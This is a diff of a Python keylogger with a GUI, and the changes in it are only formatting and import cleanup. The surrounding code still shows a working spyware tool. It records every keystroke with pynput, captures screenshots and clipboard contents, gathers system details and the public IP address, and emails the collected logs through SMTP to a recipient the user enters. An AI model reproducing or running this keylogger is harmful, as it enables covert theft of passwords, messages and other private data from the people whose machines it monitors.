@@ -1,22 +1,23 @@
 # Import necessary libraries
+import logging
+import os
+import platform
+import smtplib
+import socket
+import threading
+import tkinter
+from email import encoders
+from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import smtplib
 from time import sleep
-import socket
-import platform
-from pynput.keyboard import Key, Listener
-import os
-from requests import get
-import threading
-from PIL import ImageGrab, Image, ImageTk
 from tkinter import Label, Frame, Entry, Button, messagebox, StringVar
+
+from PIL import ImageGrab, Image, ImageTk
 from customtkinter import CTk
-import logging
 from dotenv import load_dotenv
-import tkinter
+from pynput.keyboard import Listener
+from requests import get
 
 # Load environment variables
 load_dotenv()
@@ -39,12 +40,14 @@ toAddr = ""
 state = 0
 stopFlag = False
 
+
 # Function to handle closing of the application window
 def on_closing():
     global stopFlag
     if messagebox.askokcancel("Quit", "Do you want to quit?"):
         stopFlag = True
         root.destroy()
+
 
 # Function to send email with attachment
 def send_email(filename, attachment, toaddr):
@@ -69,6 +72,7 @@ def send_email(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
 
+
 # Function to gather system information
 def computer_information():
     with open(system_information, "a") as f:
@@ -76,7 +80,7 @@ def computer_information():
         IPAddr = socket.gethostbyname(hostname)
         try:
             public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip+"\n")
+            f.write("Public IP Address: " + public_ip + "\n")
 
         except Exception:
             f.write("Public IP Address: Couldn't get Public IP Address\n")
@@ -86,6 +90,7 @@ def computer_information():
         f.write("Machine: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
+
 
 # Function to copy clipboard content
 def copy_clipboard():
@@ -98,14 +103,17 @@ def copy_clipboard():
         except tkinter.TclError:
             f.write("\nClipboard could be not be copied")
 
+
 # Function to take screenshot
 def screenshot():
     im = ImageGrab.grab()
     im.save(screenshot_information)
 
+
 # Global variables for key logging
 count = 0
 keys = []
+
 
 # Function to handle key press event
 def on_press(key):
@@ -118,13 +126,16 @@ def on_press(key):
         write_file(keys)
         keys = []
 
+
 # Function to write key logs to file
 def write_file(keys):
     for key in keys:
         k = str(key).replace("'", "")
         logging.info(k)
 
+
 listener = Listener(on_press=on_press)
+
 
 # Function to start keylogger
 def start_logger():
@@ -141,7 +152,7 @@ def start_logger():
         if (count == 0):
             screenshot()
             computer_information()
-            if (email_address and password and toAddr!=""):
+            if (email_address and password and toAddr != ""):
                 try:
                     send_email(keys_information, keys_information, toAddr)
                 except:
@@ -152,6 +163,7 @@ def start_logger():
     listener.stop()
     btnStr.set("Start Keylogger")
     listener = Listener(on_press=on_press)
+
 
 # Function to handle button click event
 def on_button_click():
@@ -175,8 +187,9 @@ def on_button_click():
         stopFlag = True
         btnStr.set("Start Keylogger")
 
+
 # Create the root window
-root = CTk() #Creating root window using customTkinter, it allows to change color of Title bar unlike the official tkinter
+root = CTk()  # Creating root window using customTkinter, it allows to change color of Title bar unlike the official tkinter
 root.geometry("800x600")
 root.config(bg="black")
 root.protocol("WM_DELETE_WINDOW", on_closing)
@@ -207,13 +220,15 @@ InputFrame = Frame(root, bg="black", pady=20)
 InputFrame.pack()
 
 # Widgets for email address entry
-receiver_label = Label(InputFrame, text="Recipients E-mail Address : ", font=("Cascadia Code", 13, "bold"), pady=20, bg="black", fg="green")
+receiver_label = Label(InputFrame, text="Recipients E-mail Address : ", font=("Cascadia Code", 13, "bold"), pady=20,
+                       bg="black", fg="green")
 receiver_entry = Entry(InputFrame, bg="black", fg="green", width=35, font=("Cascadia Code", 13, "bold"))
 receiver_entry.grid(row=0, column=1)
 receiver_label.grid(row=0, column=0)
 
 # Button to start/stop keylogger
-button = Button(root, textvariable=btnStr, command=on_button_click, width=30, bg="green", font=("Cascadia Code", 13, "bold"))
+button = Button(root, textvariable=btnStr, command=on_button_click, width=30, bg="green",
+                font=("Cascadia Code", 13, "bold"))
 button.pack()
 
 # Run the main event loop
